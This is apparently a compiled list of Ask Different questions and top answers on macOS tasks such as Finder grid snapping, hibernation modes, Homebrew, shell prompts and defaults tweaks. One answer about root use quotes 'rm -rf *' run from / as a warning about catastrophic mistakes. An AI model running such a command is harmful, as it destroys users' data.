#### 183. How can I make all folders in Finder &quot;snap to grid&quot;?

**问题描述 / Problem Description**:
Tags: macos, finder | Score: 108 | Views: 171654 | Answers: 3

**解决方案 / Solution**:
The following steps applied &quot;Snap to Grid&quot; even for previously created folders.
Tested on:

10.6.x
10.7.3
10.8.x
10.9.x
10.12.5
10.15.7
12.x


Go to any folder control
Control click on the empty space
Click on Show View Options
In the &quot;Sort by&quot; drop down bar select &quot;Snap to Grid&quot;
At the bottom of the window click on the &quot;Use as Defaults&quot;
button

NOTE: Because this will become the default setup for ALL Finder windows you may consider manipulating the Icon size, Grid spacing, Text size, Label position, Background, etc... accordingly.
ALSO: If folders do not appear to have snapped to grid on a previously created folder, Relaunch Finder or you could try to toggle the &quot;Icon size&quot; down and back up too refresh the current window.
This is where it is on 10.15 Catalina:

---

#### 184. What features of Mavericks are beneficial to you?

**问题描述 / Problem Description**:
Tags: macos | Score: 107 | Views: 21051 | Answers: 53

**解决方案 / Solution**:
The overhaul of the virtual memory system makes it clear that memory pressure is the primary factor to track and not how many free pages, inactive pages or overall virtual memory is allocated.



The bottom panel is invaluable for diagnosing a slow machine and knowing whether to rule out memory contention as a cause of the slowness. After running your Mac for a week, you should reach a nice steady state like shown above and can know if adding more RAM or adjusting the programs you run will affect performance.

---

#### 185. Shortcut key for fullscreen mode

**问题描述 / Problem Description**:
Tags: macos, keyboard, macbook-pro, window-manager | Score: 107 | Views: 322775 | Answers: 5

**解决方案 / Solution**:
The button in the top right of each window is not for minimizing and maximizing the window, but for putting it in and out of fullscreen mode (which is why it covers the menu bar, as you said). 

The keyboard shortcut to toggle fullscreen depends on the application.

Most applications that I use on a daily basis (such as Google Chrome, Terminal, Mail, and Safari) use ^+⌘+F (Control+Cmd+F) to toggle fullscreen mode.

Unfortunately, not all developers use this shortcut in their applications. iTerm, for example, uses ⌘+Enter to toggle fullscreen mode. If the application you refer to does not use either of these shortcuts, you should look for the fullscreen option in the View menu or by searching for "fullscreen" in the Help menu.

---

#### 186. Can I copy by highlighting and paste by middle click on Mac OS X?

**问题描述 / Problem Description**:
Tags: macos | Score: 107 | Views: 69608 | Answers: 13

**解决方案 / Solution**:
I wrote a free little C program that does something similar to Gilligan's answer. Whenever you drag-highlight or double-click text, it copies to the clipboard buffer. Then you can middle-mouse-click in any window to paste it. It is called "macpaste" and on Github (https://github.com/lodestone/macpaste). It works globally for every program I use that has textual data.

In iTerm2, disable their middle-click in Preferences, otherwise you'll get double pastes.

---

#### 187. Is there the dark mode (inverted colors) in the &#39;Preview&#39; Application for PDF reading?

**问题描述 / Problem Description**:
Tags: macos, pdf, preview, dark-mode | Score: 106 | Views: 131722 | Answers: 8

**解决方案 / Solution**:
I had the same problem so I wrote simple and free app for Mac to read PDFs in negative. App offers two negative modes (colour inversion and colour inversion with sepia).

It is called  Negative and it is free on the Mac App Store

---

#### 188. Is there a way to prevent apps from staying in Dock after quitting?

**问题描述 / Problem Description**:
Tags: macos, dock | Score: 106 | Views: 121522 | Answers: 5

**解决方案 / Solution**:
I think I understand your problem.. Open System Preferences, Click on dock, uncheck "Show recent applications in dock". This should probably solve your problem.

---

#### 189. How to disable scroll acceleration in macOS Sierra?

**问题描述 / Problem Description**:
Tags: mouse, macos | Score: 106 | Views: 143682 | Answers: 11

**解决方案 / Solution**:
I wrote a small program to fix this behavior: https://github.com/emreyolcu/discrete-scroll
You may download a binary here. It runs in the background and allows you to scroll 3 lines with each tick of the wheel.

---

#### 190. How to remove an environment variable on OSX using bash

**问题描述 / Problem Description**:
Tags: macos, terminal, bash, path | Score: 105 | Views: 249837 | Answers: 1

**解决方案 / Solution**:
unset it

unset DYLD_LIBRARY_PATH


The bash reference manual says


  Once a variable is set, it may be unset only by using the unset builtin command.

---

#### 191. How to make TextEdit open with a blank file by default?

**问题描述 / Problem Description**:
Tags: macos, textedit | Score: 105 | Views: 46416 | Answers: 3

**解决方案 / Solution**:
If you don't want to disable syncing documents and data, run

defaults write -g NSShowAppCentricOpenPanelInsteadOfUntitledFile -bool false


and quit and reopen TextEdit to apply the changes.

To restore (thanks to comments run)

defaults delete -g NSShowAppCentricOpenPanelInsteadOfUntitledFile


To set this for TextEdit only (thanks to comment by gklka)

defaults write com.apple.TextEdit NSShowAppCentricOpenPanelInsteadOfUntitledFile -bool false

---

#### 192. How can I update everything installed through Homebrew after OSX upgrade?

**问题描述 / Problem Description**:
Tags: macos, homebrew, package-management | Score: 105 | Views: 189595 | Answers: 1

**解决方案 / Solution**:
Use the command brew upgrade in the terminal to update all of the packages.  As for rebuilding all of your programs for the new OS build, there is no reason to do this as the compiled binary should result as the same.  If you are noticing any issues, I would just uninstall and reinstall the packages that you are having issues with.

---

#### 193. Can an app window be minimized by clicking its Dock Icon?

**问题描述 / Problem Description**:
Tags: macos, dock, icon, window-manager | Score: 104 | Views: 125243 | Answers: 12

**解决方案 / Solution**:
You can hide an active application by option-clicking (alt-clicking) its icon in the dock. You can also hide the active window and open another window by alt-clicking whatever application you want to open in the dock.

But I agree with you that it would be more symmetrical to be able to click to minimize all the open windows in an application. I am a long-time PC user and this is one area where PCs got it right. That and combining closing and quitting (and the related window management issue).

---

#### 194. Isn&#39;t Inactive memory a waste of resources?

**问题描述 / Problem Description**:
Tags: macos, mac, memory | Score: 104 | Views: 57563 | Answers: 7

**解决方案 / Solution**:
Inactive memory got a horrible rap due to a crappy name. It should have been called something like "make your Mac really fast the second, third, and fourth time it does the same task" memory except that's an awful name, too. 

Apple re-wrote the activity monitor when it introduced several new features and added compressed memory, so some of this no longer applies to macOS that don’t show “Inactive Memory” but this still applies to Mac OS X memory management as documented against this version of Activity Monitor: https://support.apple.com/en-us/HT201538

Here's how I explained things to someone new to the concept of virtual memory on OS X:


Wired: The system cannot run without this amount of RAM (never swapped)
Active: Programs are really using this memory now or in the last few seconds
Inactive: Things that programs have read from the slow disk or elsewhere and said they never need again. Engineers know better, you will go back to Facebook in a few minutes or re-launch Word after quitting it. The same things happen again and again on computers.
Free: Totally Wasted RAM - the system only needs one or two MB free to cover short term allocation requests. For largest allocations, it simply uses some of the Inactive RAM by allocating it to active/wired and removing the information on what it used to hold.


The problem arises when Free+Inactive is less than roughly 1/3 of the total and then things can really get slow. 

Inactive memory is bonus speed / double duty RAM. It serves as free at a moment's notice, but also makes repeated tasks much, much faster if the system guessed correctly and kept something in RAM that you will do again. It's faster than swapped memory since it's already loaded in RAM and accelerates things when the virtual memory system makes good guesses. 

When you are wondering if RAM is a problem, rather than looking at each of the 4 categories (5 if you count active swap), you can couple W+A as slowing down a new program/task and F+I as speeding up a new program/task. The more F+I you have, the more new programs you can launch before the RAM needs to rely on swapping to juggle the memory that has been allocated.

You don't really need to know how swap works since I mentioned it above. Basically, when a program is sitting idle and hasn't been used for days (or hours) the system will write that RAM to the hard drive rather than kill the program. This lets the system shuffle and handle all sorts of things relating to memory management and keeps each program from needing to talk amongst themselves to agree who will use less memory when the system runs out.

Here is a real world example of how inactive RAM is used.


Quit all apps and make sure the two Apps we are testing are not set to auto start when you log in
Reboot your Mac
Fire up your Activity Monitor and watch the RAM throughout
Time how long it takes to start Application A (MS Word would be a good choice)
Quit A
Time how long it takes to start Application B (Adobe something would also be good)
Quit B
Time how long the second launch of A takes
Quit A
Time B's second launch.
Time A's start the third time with B running.


You should see dramatic speedups for the second / third launch as the system learns to keep in inactive RAM the things these two apps need to run.



In your case - the total of Wired and Active means that some swapping to disk is likely happening and your Mac isn't as fast as it could be since your inactive RAM isn't large enough to store all the things you might need to reuse. If you have a fast SSD drive, this RAM allocation is OK and instead of starting to slow down once less than 1/2 of your RAM is F+I, you can cut things closer to like 1/4 of the total RAM for F+I before seeing noticeable slowness. These guidelines are general, and you'll want to watch vm_stat 15 or some similar interval to ensure continual and medium volume swapping isn't making your Mac slow.

---

#### 195. How to view Root directory and subdirectories in Finder?

**问题描述 / Problem Description**:
Tags: macos, finder, folders, root | Score: 104 | Views: 278637 | Answers: 13

**解决方案 / Solution**:
Shift-Command-G in Finder brings up a "Go to folder" dialog. Type in the name of the directory, for example, /usr/local. Finder will show the directory. I use this with Finder in 'View as Columns'

While this doesn't give a browsable directory from the root directory down, I've found it quite useful.

---

#### 196. Do MacBooks have a true &quot;Hibernate&quot; option?

**问题描述 / Problem Description**:
Tags: macos, macbook-pro, hibernate | Score: 104 | Views: 129318 | Answers: 4

**解决方案 / Solution**:
When newer laptops are put to sleep, they should save the contents of the RAM to /var/vm/sleepimage but keep the RAM powered as well. Desktop Macs should just use normal sleep mode by default.

man pmset:

hibernatemode = 0 (binary 0000) by default on supported desktops. The
system will not back memory up to persistent storage. The system must
wake from the contents of memory; the system will lose context on power
loss. This is, historically, plain old sleep.

hibernatemode = 3 (binary 0011) by default on supported portables. The
system will store a copy of memory to persistent storage (the disk), and
will power memory during sleep. The system will wake from memory, unless
a power loss forces it to restore from disk image.

hibernatemode = 25 (binary 0001 1001) is only settable via pmset. The
system will store a copy of memory to persistent storage (the disk), and
will remove power to memory. The system will restore from disk image. If
you want "hibernation" - slower sleeps, slower wakes, and better battery
life, you should use this setting.



0 (traditional sleep mode): fast wake up and sleep, saves disk space
3 (default safe sleep mode): fast wake up and sleep, state is kept when losing power
25 (hibernation): saves energy, state is kept when losing power


You can see which mode your Mac uses with pmset -g | grep hibernatemode and change it with sudo pmset -a hibernatemode $mode.

Some newer Macs support a standby mode on 10.8 and later. Even if hibernatemode was set to 3, they power off memory after a bit over an hour of sleep.

---

#### 197. Why doesn&#39;t Mac OS X source ~/.bashrc?

**问题描述 / Problem Description**:
Tags: macos, terminal, bash, command-line | Score: 104 | Views: 183444 | Answers: 2

**解决方案 / Solution**:
In OSX the terminal  by default starts a login session so reads .bash_profile etc. (The GUI login process that asks for your name and password does not use shell scripts and starts no shell it is all done from launchd and the workspace)
On other Unices xterm runs a non login shell by default so they read .bashrc as the scripts that present you with your password etc at login call the login session and all terminals are sub process of this and inherit the shell environment.
From the GNU document you referred to

Invoked as an interactive non-login shell
When an interactive shell that is not a login shell is started, Bash
reads and executes commands from ~/.bashrc, if that file exists. This
may be inhibited by using the --norc option. The --rcfile file option
will force Bash to read and execute commands from file instead of
~/.bashrc.
So, typically, your ~/.bash_profile contains the line
if [ -f ~/.bashrc ]; then . ~/.bashrc; fi 

after (or before) any
login-specific initializations.

---

#### 198. Set default mail client in macOS without adding an email account?

**问题描述 / Problem Description**:
Tags: macos, mail.app, ms-office, preferences | Score: 103 | Views: 56998 | Answers: 13

**解决方案 / Solution**:
Update: Seems like Microsoft finally removed this tool. The suggested solution in their support documentation is
https://support.microsoft.com/en-us/office/set-an-account-as-the-default-in-outlook-for-mac-1a085d36-db97-4230-9a40-c332364426e0
I finally found something easy that worked, the SetDefaultMailApp from Microsoft:
https://docs.microsoft.com/en-us/outlook/troubleshoot/outlook-for-mac/useful-tools#setdefaultmailapp

---

#### 199. Why is the accountsd process eating so much CPU?

**问题描述 / Problem Description**:
Tags: macos, icloud, cpu | Score: 103 | Views: 251228 | Answers: 18

**解决方案 / Solution**:
In Mail.app's application's preferences, I deselected "Accounts > Advanced > Automatically Detect and Maintain Account Settings" on two Google accounts, and CPU usage returned to normal.

---

#### 200. Application level volume control in OS X?

**问题描述 / Problem Description**:
Tags: macos, software-recommendation, mac, audio, software | Score: 103 | Views: 331864 | Answers: 13

**解决方案 / Solution**:
A free and open-source solution is BackgroundMusic.
A nicer and paid solution is Rogue Amoeba's SoundSource

---

#### 201. Why won&#39;t closing the lid sleep my MacBook Pro with external monitor attached after upgrading to Lion?

**问题描述 / Problem Description**:
Tags: macbook-pro, macos, sleep-wake | Score: 103 | Views: 105833 | Answers: 9

**解决方案 / Solution**:
edit: See this as the behaviour has changed: Why won&#39;t closing the lid sleep my MacBook Pro with external monitor attached after upgrading to Lion?

There are two groups of people. Those who wish to have dual displays and have closing the lid go into sleep and people who wish to disable the monitor display, close the lid and use the external monitor as if you had 'docked' with it.

Previously, if you wished to switch from the macbook to an external monitor entirely then you had to perform the following to put the laptop into clamshell mode:


Make sure the computer is plugged in to an outlet using the AC power
adapter.
Connect a USB keyboard and mouse to your computer.
With the computer turned on connect the Apple portable (using the appropriate
Apple adapter if necessary) to the appropriate port on the external
display or projector and turn the display or projector on.
Once your computer's Desktop appears on the external display, close the
computer's lid.
Once the lid is closed, wake the computer up by
either clicking your mouse button or by pressing a key on your
external keyboard.


source: http://support.apple.com/kb/ht3131

So to put the machine in clamshell mode required you to put it to sleep and wake it back up again. As far as user experience goes, that is somewhat jarring.

As you have the other options to put the machine to sleep, it seems very likely that this change will remain.

Right now, there is no way to alter this behaviour.

---

#### 202. Single application not showing up in Spotlight

**问题描述 / Problem Description**:
Tags: macos, spotlight | Score: 102 | Views: 33053 | Answers: 5

**解决方案 / Solution**:
Go to System Preferences --&gt; Spotlight --&gt; Privacy. While that's open, go to Finder --&gt; Applications and drag Matlab from Applications into Privacy. Close out System Preferences then reopen it and remove Matlab from the same place. 

This will force a reindex for Spotlight. I've seen this work for some people and not for others but it's worth a shot.

---

#### 203. How do I start TextEditor from the command line?

**问题描述 / Problem Description**:
Tags: terminal, command-line, text-editor | Score: 102 | Views: 444897 | Answers: 10

**解决方案 / Solution**:
Here are some possible answers, all using the 'open' command-line utility.

The -a option means "open the file argument with the named application":

open -a TextEdit file.txt

The -e option means "open the file argument with the TextEdit application":

open -e file.txt

The -t option means "open the file with the default application for editing text files, as determined via LaunchServices". By default, this will be /Applications/TextEdit.app; however, it's possible for this setting to get overridden:

open -t file.txt

Finally, any file that's of the "text" type will get opened by the application bound to the text type if you just say open file.txt. You can use the "file" command to reveal what the operating system thinks the file type is: file file.txt. So, for example, if you renamed "file.txt" to just "textfile" then open textfile would still open it in the default text-file editing application, as long as file textfile still thought that "textfile" was actually a text file.

A short 'help' file on open can be found by running

open --help


Or you can read the whole manual with

man open

---

#### 204. How can I activate buttons with just the keyboard?

**问题描述 / Problem Description**:
Tags: macos, keyboard, mouse, ui | Score: 101 | Views: 42512 | Answers: 7

**解决方案 / Solution**:
Enable Keyboard Control of the UI

System Prefs &gt; Keyboard &gt; Shortcuts


Then select "All Controls" radio button at the bottom, rather than just "Text boxes and lists only".



Keyboard Shortcuts


&#x21E5; (TAB) will move between buttons.
esc (ESC) is cancel.
space (SPACE) selects the active button (blue, outline).
&#x21A9; (RETURN) is OK or the default button (blue, pulsing, filled).
For some dialog boxes, ⌘+first_letter will select the button with a certain first letter in the text (as pointed out by @Griffo).

---

#### 205. How to hide computer name and user name in terminal command prompt

**问题描述 / Problem Description**:
Tags: macos, terminal | Score: 101 | Views: 197003 | Answers: 9

**解决方案 / Solution**:
Change your prompt in your ~/.bashrc file. The example you asked for would be:
export PS1=&quot;\W \$&quot;

It would result in the current folder you're in being shown plus a $ for the regular prompt and a # if you're root. Check out this guide for more examples of what you could show in your prompt.
Edit:
As per one of the comments below, you might need to source your ~/.bashrc from your ~/.bash_profile or even put this code in your ~/.bash_profile instead. You can read this article for a better explanation on which file to use.
If you are NOT using BASH but ZSH, do the following:
(1) nano ~/.zshrc,
(2) add this line at the end of the file export PS1=&quot;\$ &quot;,
(3) save the file, ~/.zshrc,
(4) source the zshrc to apply the change with source ~/.zshrc.
(5) You should be good at this point!

---

#### 206. Where does the Mac store account pictures?

**问题描述 / Problem Description**:
Tags: macos, photos | Score: 101 | Views: 192488 | Answers: 9

**解决方案 / Solution**:
Mac OS X 10.5+ stores user's account pictures within the Directory Service with the exception of an account that has not modified their user picture from when first created. When first created an account contains a 'Picture' attribute in their user record that is a path to the image in question. This can be read using the dscl command (dscl . -read /Users/${USER} Picture).

If a user has modified their user picture at any time the account picture (aka cropped version if appropriate), it is stored in the 'JPEGPhoto' attribute of their user record.

Original files can be found at /Library/User Pictures if you're looking for an Apple provided picture, while your personal original files should be found at ~/Library/Images/iChat Recent Pictures/. If the files are ever removed from the iChat Recent Pictures folder, it will not affect your user account's image whatsoever.

If you wish to extract a version of your account picture you can do so by running the following command

dscl . -read /Users/${USER} JPEGPhoto | tail -1 | xxd -r -p &gt; ${HOME}/Desktop/accountImage.jpg


The resolution can vary, depending on the original size of the photo and what version of the operating system you're using when it is saved.

If you are running Mac OS X 10.4, my memory is failing me as I don't recall if the user picture was stored in NetInfo or not.

---

#### 207. Are my permissions for /usr/local/ correct?

**问题描述 / Problem Description**:
Tags: terminal, macports, permission, homebrew | Score: 101 | Views: 190388 | Answers: 7

**解决方案 / Solution**:
I use Homebrew too and can confirm it's totally safe. Quoting the Installation page on the official Homebrew FAQ:


  Do yourself a favour and pick /usr/local
  
  
  It’s easier
  /usr/local/bin is already in your PATH.
  It’s easier
  Tons of build scripts break if their dependencies aren’t in either /usr or /usr/local. We fix this for Homebrew formulas (although we don’t always test for it), but you’ll find that many RubyGems and Python setup scripts break which is something outside our control.
  It’s safe
  Apple has conformed to POSIX and left this directory for us. Which means there is no /usr/local directory by default, so there is no need to worry about messing up existing tools.
  
  
  If you plan to install gems that depend on brews then save yourself a bunch of hassle and install to /usr/local!
  
  It is not trivial to tell gem to look in non-standard directories for headers and dylibs. If you choose /usr/local, everything “just works!”


I'll just add that doing things as root is a very bad idea, so chowning /usr/local not only seems reasonable to me (it's not a system dir on OSX), but sane.

Your permissions are not correct (yet). Just run the command you listed and you're gonna be fine.

If you have other problems remember, the brew doctor can help you!

---

#### 208. What is &quot;photoanalysisd&quot; and why is it using 77% of my CPU?

**问题描述 / Problem Description**:
Tags: macos, photos.app, cpu | Score: 100 | Views: 313432 | Answers: 9

**解决方案 / Solution**:
Update for 2019, 16&quot; MacBook Pro running Catalina 10.15.2:

start Photos, let it continue past the first dialogue box;

now Preferences… in the main app menu under Photos just right after Apple logo is clickable (it wasn't before);

Preferences… (⌘+,) → General tab , and untick both check boxes in Memories;


close Photos.


This stops photoanalysisd cold, no reboot or kill required.

---

#### 209. Is bash in OSX case-insensitive?

**问题描述 / Problem Description**:
Tags: macos, terminal, bash | Score: 100 | Views: 72807 | Answers: 5

**解决方案 / Solution**:
This is actually a feature of the filesystem of your disk, not bash or Terminal.app.
HFS+ (the Mac filesystem) is usually configured to be case insensitive but case preserving. This means that the file system will consider foo and FoO to be the same, but when you create a new file it will remember which letters where capitalized and which were not.
When you format a disk with HFS+ you can chose whether the file system should case sensitive or not. If you chose to format with UFS (Unix FileSystem) it is always case sensitive, AFAIK.
To check whether a disk is case sensitive, run:
 diskutil info &lt;device&gt;

For example:
 diskutil info disk0s2

Look for the Name: line. If it reads something like Mac OS Extended (Case-sensitive, Journaled) it means that it is case-sensitive. If it just reads Mac OS Extended (without the Case-sensitive) then it is only case preserving but not case sensitive.

Since macOS 10.13, the default Apple file system is now APFS which is case-insensitive but case-preserving by default. Like HFS+, it can also be formatted to be case-sensitive. To see which mode is used you now have to use:
diskutil ap list

(diskutil info &lt;device&gt; does not print whether an APFS slice is case-sensitive or not.)

---

#### 210. Why is the Code Helper process in VS Code using more than 100% CPU on macOS?

**问题描述 / Problem Description**:
Tags: macos, cpu, activity-monitor, visual-studio-code | Score: 100 | Views: 150438 | Answers: 12

**解决方案 / Solution**:
This is most likely an issue with a plugin in VS Code. For me, it was Pyright.
How to check?

Open Activity Monitor

Within the list of prcesses, find the Code Helper (Plugin) that has the highest CPU usage (it should already be at the top).

You can also try Code Helper (Renderer) processes, but they don't seem to have easily-accessible extension info


For this process, find the PID number.

Then, within terminal, type this:
ps aux | grep 20295

note that you should change &quot;20295&quot; to the PID number that you found in step 3


This should give you the information as to which extension it is. I, personally, would remove it, but that's up to you. At the very least, please contact the maintainer of that package and make sure that they are aware of the issue.
After removing the extension, exit VS Code, wait for a bit while the fans slow down and then start again. It shouldn't give you a problem now.
Happy coding!

---

#### 211. Disable line wrapping for output in the Terminal

**问题描述 / Problem Description**:
Tags: macos, terminal | Score: 100 | Views: 62406 | Answers: 7

**解决方案 / Solution**:
tput did the trick for me:

tput rmam


disables line wrapping.

tput smam


enables line wrapping.

---

#### 212. How do I get F11 and F12 to behave like normal function keys?

**问题描述 / Problem Description**:
Tags: macos, keyboard, system-settings, preferences | Score: 99 | Views: 153925 | Answers: 1

**解决方案 / Solution**:
Well I actually just figured this out.  In Preferences under Mission Control there were two options set to use the F11 and F12 keys.  I set these to '-' and that fixed the issue.  The options that were set to use these function keys are highlighted in the screenshot below.

2024 Note: MacOS Sonoma 14.3.1 this config option has moved: System Settings →  Desktop &amp; Dock →  Keyboard and Mouse Shortcut →  Show Desktop

---

#### 213. Is it safe to upgrade Bash via Homebrew?

**问题描述 / Problem Description**:
Tags: macos, bash, homebrew | Score: 98 | Views: 37014 | Answers: 4

**解决方案 / Solution**:
Binaries in /{,usr/}{,s}bin/ should not usually be replaced with other files. Other programs expect them to be the versions that came with OS X, and they are replaced by OS upgrades.

After running brew install bash, you can change the default shell safely by:


Adding /usr/local/bin/bash to /etc/shells
Running chsh -s /usr/local/bin/bash.


Settings in Terminal or iTerm 2 don't normally have to be changed. Both of them default to opening new windows with a login shell of the default shell.

The default shell can also be changed from System Preferences or with dscl, but all three options just modify /var/db/dslocal/nodes/Default/users/$USER.plist.

---

#### 214. Is it &#39;OK&#39; to use the root user as a normal user?

**问题描述 / Problem Description**:
Tags: macos, user-account, root | Score: 97 | Views: 54074 | Answers: 10

**解决方案 / Solution**:
Using your computer logged in as root all the time is like always carrying around all your keys, your passport, $5,000 in cash, that piece of paper with all your passwords written on it and the only photo you have of Flopsy, the adorable rabbit whose death broke your seven-year-old heart. Oh, and a chainsaw.

Which is to say, it's mighty convenient from time to time, because it means you can do whatever you want, whenever you want, without needing to go back home to get stuff or talk to your bank manager. But it also puts you at great risk of losing stuff, having it stolen (don't think that chainsaw will help you: you'll be streets away before you notice your wallet's gone), doing things you really regret later (impulse-buying plane tickets to Vegas while drunk), taking dangerous shortcuts (chainsawing through the lion enclosure fence because that's the fastest way to the pandas) and over-reacting (chainsawing your neighbour's car because his dog barks too much). And, when you think about it, mostly, you're just going to the office, going grocery shopping, hanging out with your friends. You don't need all that stuff with you all the time just for the convenience of needing it, what?, once a month? Once a week?

So, no, it's not OK to use the root account all the time. It gives you a tiny amount of convenience but puts you in a lot of danger. There's the danger of stupid mistakes having catastrophic results ("Hey, why is rm -rf * taking so long to run? **** I'm in /!"). There's the danger of acclimating yourself to the idea that all files are equal and you can just mess about with whatever you want, anywhere in the directory tree. There's the danger that any hack to your account is immediately a hack to the whole system, so now every single piece of software on your machine is security-critical. And even if you think you don't care about your machine getting hacked (after all, that photo of Flopsy is a real piece of glossy paper, not some ephemeral JPEG), I care about your machine getting hacked because then it's on the botnet that's mounting the DDOS attack against whatever internet service I can't access today.

Root is your spiderman costume. It gives you great power but requires great responsibility. It's there in the closet whenever you need it, so you don't have to wear it all the time.

---

#### 215. How can I disable the red Software Update notification bubble on the System Preferences app in MacOS Mojave (not App Store)?

**问题描述 / Problem Description**:
Tags: macos, software-update, dock, notifications, system-settings | Score: 97 | Views: 151722 | Answers: 5

**解决方案 / Solution**:
After some unsuccessful googling, followed by loads and loads of digging and grepping through binary files, I stumbled upon a key in a .plist which, when written, appeared to make the system temporarily forget it had any updates to bother me with. Running:
defaults write com.apple.systempreferences AttentionPrefBundleIDs 0

fixed my issue for now on 10.14.1 (Apparently, you may also have to restart the dock with killall Dock, but I don't remember having to do so).
It seems to work up through at least Monterey (12), too.
If you have automatic checking for updates turned on, this might not work for you. Not for long, anyway. In my case, on a fresh install, I went to the settings page to turn off checking for updates, at which time it checked for an update before I could close the page. After running that command again it went away once more, though. Basically, turn off automatic update checks, or it'll come right back and you'll have to run the command again.
Re-running the update checker should undo this. One might be able to find that .plist (I believe it was in /Users/[username]/Library/Preferences/com.apple.systempreferences.plist) and set the immutable bit on it/give it read only permissions to prevent it getting modified, but I have no idea what the fallout from that could be. You'd probably not be able to change any other per-user settings anymore.

Edit: Some have suggested setting it like:
defaults write com.apple.systempreferences AttentionPrefBundleIDs '{ &quot;com.apple.preferences.softwareupdate&quot; = 0; }'

instead. This seems to work, and is the default value on a fresh install, at least for some newer versions - but it is also more difficult to type and ultimately has the same impact, so I still just use the top version and have noticed no ill effects.

---

#### 216. How to set to open folder with enter in finder?

**问题描述 / Problem Description**:
Tags: macos, keyboard, finder, folders, filesystem | Score: 97 | Views: 83240 | Answers: 10

**解决方案 / Solution**:
Any person new to Apple and Mac would find lot of things un-intuitive or just forced on the user, w/o any options to change it.
Or it might be that just many of us had their first experiences on Win/Linux systems.

But just found this plugin to finder XtraFinder which among lot of other options allows you to ENTER/RETURN to open a file.

Feeling a lot relieved now! Hope it helps.

---

#### 217. How can I list all user accounts in the terminal?

**问题描述 / Problem Description**:
Tags: macos, terminal, command-line | Score: 96 | Views: 325649 | Answers: 8

**解决方案 / Solution**:
How about

dscacheutil -q user | grep -A 3 -B 2 -e uid:\ 5'[0-9][0-9]'

---

#### 218. What is the ⎋ symbol shown in the menu shortcuts?

**问题描述 / Problem Description**:
Tags: macos, snow-leopard, finder | Score: 96 | Views: 35504 | Answers: 5

**解决方案 / Solution**:
To be concise: the symbol you're asking about, the circle with the arrow escaping from it (that's the way I remember what it means), is the Apple way of saying 'The ESC Key'.

So the menu item ⌥⌘⎋ 
is option+command+esc pressed simultaneously.

---

#### 219. How to open terminal in Mac using keyboard shortcut?

**问题描述 / Problem Description**:
Tags: macos, terminal, mac | Score: 96 | Views: 389512 | Answers: 2

**解决方案 / Solution**:
Press CmdSpace to open spotlight search, and type terminal and hit return.

Or if you are in the terminal press CmdT to open a new tab OR CmdN to open a new Terminal window.

---

#### 220. This copy of the Install OS X El Capitan application can&#39;t be verified. It may have been corrupted or tampered with during downloading

**问题描述 / Problem Description**:
Tags: macos, install | Score: 95 | Views: 326245 | Answers: 13

**解决方案 / Solution**:
To save having to scroll right down to the newest answer to find this info…
Apple rebuilt all the installers in about 2020 to fix this issue once &amp; for all - see Apple KB - How to Download macOS

Follow this tutorial. This applies to the reply from @Cazuma Nii Cavalcanti. In short once you are at the first install page go to tools in the nav bar and open the terminal, in the terminal type date MMDDHHmmYY replacing the letters as follows.
MM - 2 digit month  01 - 12
DD - 2 digit date   01 - 31
HH - 2 digit hour   01 - 24
mm - 2 digit minute 01 - 59
YY - 2 digit year   &gt; 15

once that is done go through the install normally. I just tried it and it worked with a USB install of OS X (10.11 - El Capitan) and it worked like a charm!
If setting to correct date doesn't work. Set to a date just after the os release.

---

#### 221. Displaying combined file size of selected files in Finder

**问题描述 / Problem Description**:
Tags: macos, finder | Score: 95 | Views: 50498 | Answers: 2

**解决方案 / Solution**:
Instead of &#x2318;+I use &#x2318;+&#x2325;+I to see the info:



Cmd+Ctrl+I does something similar, but gives you a static Summary Info window which doesn't update as your selection changes, and you can open multiple windows for different selections, which is handy for comparing groups of synced folders for example.

---

#### 222. How to install an homebrew formula without updating homebrew itself?

**问题描述 / Problem Description**:
Tags: macos, command-line, homebrew | Score: 95 | Views: 67340 | Answers: 3

**解决方案 / Solution**:
According to this github issue and to the man page, the environment variable HOMEBREW_NO_AUTO_UPDATE can be set to 1.
HOMEBREW_NO_AUTO_UPDATE=1 brew install &lt;formula&gt;

This will stop the homebrew update for this command. If you want to prevent auto update for your shell session, use:
export HOMEBREW_NO_AUTO_UPDATE=1

to set it permanently, add it to your ~/.bash_profile. Note that changing this permanently is discouraged by the developers.

---

#### 223. Changing Creation Date of a file

**问题描述 / Problem Description**:
Tags: macos | Score: 94 | Views: 157844 | Answers: 5

**解决方案 / Solution**:
touch -t normally only changes the modification and access times. It only changes the creation time if the target time is before the original creation time.
touch -t 199912312359 file.txt
touch -t $(date -jf %FT%T 1999-12-31T23:59:59 +%Y%m%d%H%M%S) file.txt

SetFile -d always changes the creation time.
SetFile -d '12/31/1999 23:59:59' file.txt
SetFile -d &quot;$(GetFileInfo -m test.txt)&quot; file.txt

SetFile is part of the command line tools package which can be installed using xcode-select --install or downloaded from developer.apple.com/downloads or from Xcode's preferences.

---

#### 224. What I can delete from /private/var/vm?

**问题描述 / Problem Description**:
Tags: finder, macos, virtual-memory | Score: 94 | Views: 177950 | Answers: 6

**解决方案 / Solution**:
/var/vm/sleepimage is used to store the contents of the RAM during hibernation, and the hybrid hibernation and sleep mode that Mac laptops use by default. If you have 8 GiB of RAM, /var/vm/sleepimage takes about 8 GiB of disk space. I don't know why it isn't deleted after waking up from sleep though. It might be to ensure that there is enough free disk space for it or so that it won't be stored on non-contiguous blocks if disk space is low.
You can delete /var/vm/sleepimage safely, but it will be recreated when you put the Mac to sleep. If you run sudo pmset -a hibernatemode 0; sudo rm /var/vm/sleepimage, the Mac will use a normal sleep mode (like desktop Macs by default) and it won't recreate /var/vm/sleepimage.
From man pmset:

hibernatemode = 0 (binary 0000) by default on supported desktops. The system will not back memory up to persistent storage. The system must wake from the contents of memory; the system will lose context on power loss. This is, historically, plain old sleep.
hibernatemode = 3 (binary 0011) by default on supported portables. The system will store a copy of memory to persistent storage (the disk), and will power memory during sleep. The system will wake from memory, unless a power loss forces it to restore from disk image.
hibernatemode = 25 (binary 0001 1001) is only settable via pmset. The system will store a copy of memory to persistent storage (the disk), and will remove power to memory. The system will restore from disk image. If you want &quot;hibernation&quot; - slower sleeps, slower wakes, and better battery life, you should use this setting.


0 (traditional sleep mode) enables fast wake up and sleep, saves disk space, and reduces writing to the drive.
3 (hybrid hibernation and safe sleep mode) enables fast wake up and sleep and enables restoring state after a power loss.
25 (hibernation) saves energy and enables restoring state after a power loss.

I used hibernatemode 0 with my MacBook Air. Even if the MacBook Air went to sleep when the battery was nearly empty, the battery didn't usually drain out completely during sleep. /var/vm/sleepimage took about 4 GiB of disk space, and writing it hundreds or thousands of times might have reduced the lifespan of the SSD.

---

#### 225. MacBook unplugged from external monitor thinks it&#39;s still the Secondary Desktop

**问题描述 / Problem Description**:
